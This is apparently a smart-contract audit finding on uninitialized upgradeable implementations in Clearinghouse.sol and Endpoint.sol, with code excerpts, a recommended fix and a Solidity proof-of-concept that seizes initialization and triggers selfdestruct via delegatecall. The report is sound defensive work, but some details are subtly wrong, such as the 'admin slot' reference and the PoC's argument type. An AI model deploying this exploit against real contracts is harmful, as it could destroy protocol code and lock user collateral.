### Title
Uninitialized Implementation Contracts Allow Attacker Takeover via `initialize()` - (File: `core/contracts/Clearinghouse.sol`, `core/contracts/Endpoint.sol`)

---

### Summary
`Clearinghouse` and `Endpoint` are deployed as OpenZeppelin Transparent Upgradeable Proxies. Their implementation contracts expose a public `initialize()` function protected only by the `initializer` modifier, but neither contract defines a constructor calling `_disableInitializers()`. An unprivileged attacker can call `initialize()` directly on the implementation address, seizing ownership of the implementation and enabling arbitrary `delegatecall` execution within its storage context.

---

### Finding Description

`BaseProxyManager`, `ContractOwner`, `Verifier`, `Airdrop`, and `BaseWithdrawPool` all correctly guard their implementations with `_disableInitializers()` in their constructors. [1](#0-0) [2](#0-1) [3](#0-2) 

`Clearinghouse` and `Endpoint` do not. Neither contract defines any constructor, leaving the implementation's `initialized` slot at zero. [4](#0-3) [5](#0-4) 

`SpotEngine`, `PerpEngine`, and `OffchainExchange` are in the same position — they use the `initializer` modifier via `BaseEngine._initialize()` but define no constructor. [6](#0-5) [7](#0-6) [8](#0-7) 

The critical path runs through `Clearinghouse`. Its `initialize()` accepts attacker-controlled values for `_endpoint` and `_clearinghouseLiq`:

```solidity
function initialize(
    address _endpoint,
    address _quote,
    address _clearinghouseLiq,   // attacker-supplied
    uint256 _spreads,
    address _withdrawPool
) external initializer {
    __Ownable_init();
    setEndpoint(_endpoint);      // attacker-supplied
    clearinghouseLiq = _clearinghouseLiq;
    ...
}
``` [9](#0-8) 

After initialization, `liquidateSubaccount()` performs an unrestricted `delegatecall` to `clearinghouseLiq`, gated only by `onlyEndpoint` — which the attacker satisfies because they supplied the endpoint address:

```solidity
function liquidateSubaccount(...) external virtual onlyEndpoint {
    ...
    (bool success, bytes memory result) = clearinghouseLiq.delegatecall(
        liquidateSubaccountCall
    );
    ...
}
``` [10](#0-9) 

`onlyEndpoint` checks `msg.sender == endpoint`, and `endpoint` was set by the attacker during `initialize()`. [11](#0-10) 

The same pattern applies to `Endpoint`: `initialize()` accepts an attacker-supplied `_endpointTx`, and `_delegatecallEndpointTx()` unconditionally delegates to it, gated only by the fact that the caller must be the sequencer — but on the implementation the attacker controls the sequencer slot too. [12](#0-11) [13](#0-12) 

---

### Impact Explanation

**Corrupted state delta:** The attacker gains ownership of the implementation contract and can execute arbitrary code via `delegatecall` in the implementation's storage context. Concretely:

1. Any ERC-20 tokens accidentally sent to the implementation address (a known operational risk) can be drained by the attacker through the `delegatecall` to a malicious `clearinghouseLiq`.
2. The implementation's storage — including `clearinghouseLiq`, `withdrawPool`, `spreads`, `insurance`, and all subaccount balances stored there — can be arbitrarily corrupted.
3. On chains where `selfdestruct` still destroys code (pre-EIP-6780 semantics or same-transaction creation), the attacker can destroy the implementation via the `delegatecall`, permanently bricking the Clearinghouse and Endpoint proxies and locking all user collateral.

The live proxy's storage is isolated from the implementation's storage under the Transparent Proxy pattern, so the proxy itself is not directly corrupted. However, implementation destruction is irreversible and would halt the entire protocol.

---

### Likelihood Explanation

**High.** The `initialize()` function on the implementation is callable by any EOA with no preconditions. No privileged access, governance action, or leaked key is required. The attacker only needs the implementation address, which is publicly readable from the proxy's EIP-1967 admin slot or from `ProxyManager.proxies`. [14](#0-13) 

---

### Recommendation

Add a constructor calling `_disableInitializers()` to every upgradeable implementation contract that lacks one:

```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
```

Affected contracts: `Clearinghouse`, `Endpoint`, `SpotEngine`, `PerpEngine`, `OffchainExchange`. [15](#0-14) [16](#0-15) [17](#0-16) [18](#0-17) [19](#0-18) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

interface IClearinghouseImpl {
    function initialize(
        address _endpoint,
        address _quote,
        address _clearinghouseLiq,
        uint256 _spreads,
        address _withdrawPool
    ) external;
    function liquidateSubaccount(bytes calldata txn) external;
}

contract MaliciousClearinghouseLiq {
    // In delegatecall context this executes inside the Clearinghouse implementation
    fallback() external {
        selfdestruct(payable(msg.sender)); // destroys the implementation
    }
}

contract Exploit {
    function attack(address clearinghouseImpl) external {
        MaliciousClearinghouseLiq malicious = new MaliciousClearinghouseLiq();

        // Step 1: seize ownership of the implementation
        IClearinghouseImpl(clearinghouseImpl).initialize(
            address(this),          // attacker is now the "endpoint"
            address(0),
            address(malicious),     // malicious clearinghouseLiq
            0,
            address(0)
        );

        // Step 2: trigger delegatecall → selfdestruct on the implementation
        // (passes onlyEndpoint because msg.sender == address(this) == endpoint)
        IClearinghouseImpl(clearinghouseImpl).liquidateSubaccount(
            abi.encode(/* dummy LiquidateSubaccount struct */)
        );
        // Implementation is now destroyed; all proxy calls revert permanently.
    }
}
```

### Citations

**File:** core/contracts/BaseProxyManager.sol (L84-87)
```text
    mapping(string => address) public proxies;
    mapping(string => address) public pendingImpls;
    mapping(string => bytes32) public pendingHashes;
    mapping(string => bytes32) public codeHashes;
```

**File:** core/contracts/BaseProxyManager.sol (L102-105)
```text
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
```

**File:** core/contracts/Airdrop.sol (L19-22)
```text
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
```

**File:** core/contracts/BaseWithdrawPool.sol (L18-21)
```text
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
```

**File:** core/contracts/Clearinghouse.sol (L21-40)
```text
contract Clearinghouse is EndpointGated, ClearinghouseStorage, IClearinghouse {
    using MathSD21x18 for int128;
    using ERC20Helper for IERC20Base;

    function initialize(
        address _endpoint,
        address _quote,
        address _clearinghouseLiq,
        uint256 _spreads,
        address _withdrawPool
    ) external initializer {
        __Ownable_init();
        setEndpoint(_endpoint);
        quote = _quote;
        clearinghouse = address(this);
        clearinghouseLiq = _clearinghouseLiq;
        spreads = _spreads;
        withdrawPool = _withdrawPool;
        emit ClearinghouseInitialized(_endpoint, _quote);
    }
```

**File:** core/contracts/Clearinghouse.sol (L644-662)
```text
    function liquidateSubaccount(IEndpoint.LiquidateSubaccount calldata txn)
        external
        virtual
        onlyEndpoint
    {
        bytes4 liquidateSubaccountSelector = bytes4(
            keccak256(
                "liquidateSubaccountImpl((bytes32,bytes32,uint32,bool,int128,uint64))"
            )
        );
        bytes memory liquidateSubaccountCall = abi.encodeWithSelector(
            liquidateSubaccountSelector,
            txn
        );
        (bool success, bytes memory result) = clearinghouseLiq.delegatecall(
            liquidateSubaccountCall
        );
        require(success, string(result));
    }
```

**File:** core/contracts/Endpoint.sol (L23-66)
```text
contract Endpoint is
    EIP712Upgradeable,
    OwnableUpgradeable,
    EndpointStorage,
    IEndpoint
{
    using ERC20Helper for IERC20Base;

    function initialize(
        address _sanctions,
        address _sequencer,
        address _offchainExchange,
        IClearinghouse _clearinghouse,
        address _verifier,
        address _endpointTx
    ) external initializer {
        __Ownable_init();
        __EIP712_init("Nado", "0.0.1");
        sequencer = _sequencer;
        clearinghouse = _clearinghouse;
        offchainExchange = _offchainExchange;
        verifier = IVerifier(_verifier);
        sanctions = ISanctionsList(_sanctions);
        endpointTx = _endpointTx;
        spotEngine = ISpotEngine(
            clearinghouse.getEngineByType(IProductEngine.EngineType.SPOT)
        );
        perpEngine = IPerpEngine(
            clearinghouse.getEngineByType(IProductEngine.EngineType.PERP)
        );
        slowModeConfig = SlowModeConfig({timeout: 0, txCount: 0, txUpTo: 0});
        priceX18[QUOTE_PRODUCT_ID] = ONE;

        if (nlpPools.length == 0) {
            nlpPools.push(
                NlpPool({
                    poolId: 0,
                    subaccount: N_ACCOUNT,
                    owner: address(0),
                    balanceWeightX18: uint128(ONE)
                })
            );
        }
    }
```

**File:** core/contracts/Endpoint.sol (L68-84)
```text
    function _delegatecallEndpointTx(bytes memory callData)
        internal
        returns (bytes memory)
    {
        require(endpointTx != address(0), "Endpoint Tx not set");
        (bool success, bytes memory result) = endpointTx.delegatecall(callData);
        if (!success) {
            if (result.length == 0) {
                revert();
            }
            // solhint-disable-next-line no-inline-assembly
            assembly {
                revert(add(result, 0x20), mload(result))
            }
        }
        return result;
    }
```

**File:** core/contracts/BaseEngine.sol (L203-218)
```text
    function _initialize(
        address _clearinghouseAddr,
        address _offchainExchangeAddr,
        address _endpointAddr,
        address _admin
    ) internal initializer {
        __Ownable_init();
        setEndpoint(_endpointAddr);
        transferOwnership(_admin);

        _clearinghouse = IClearinghouse(_clearinghouseAddr);

        canApplyDeltas[_endpointAddr] = true;
        canApplyDeltas[_clearinghouseAddr] = true;
        canApplyDeltas[_offchainExchangeAddr] = true;
    }
```

**File:** core/contracts/SpotEngine.sol (L11-11)
```text
contract SpotEngine is SpotEngineState {
```

**File:** core/contracts/SpotEngine.sol (L14-22)
```text
    function initialize(
        address _clearinghouse,
        address _offchainExchange,
        address _quote,
        address _endpoint,
        address _admin
    ) external {
        _initialize(_clearinghouse, _offchainExchange, _endpoint, _admin);

```

**File:** core/contracts/PerpEngine.sol (L11-11)
```text
contract PerpEngine is PerpEngineState {
```

**File:** core/contracts/PerpEngine.sol (L14-22)
```text
    function initialize(
        address _clearinghouse,
        address _offchainExchange,
        address,
        address _endpoint,
        address _admin
    ) external {
        _initialize(_clearinghouse, _offchainExchange, _endpoint, _admin);
    }
```

**File:** core/contracts/EndpointGated.sol (L25-31)
```text
    modifier onlyEndpoint() {
        require(
            msg.sender == endpoint,
            "SequencerGated: caller is not the endpoint"
        );
        _;
    }
```

**File:** core/contracts/OffchainExchange.sol (L20-24)
```text
contract OffchainExchange is
    IOffchainExchange,
    EndpointGated,
    EIP712Upgradeable
{
```
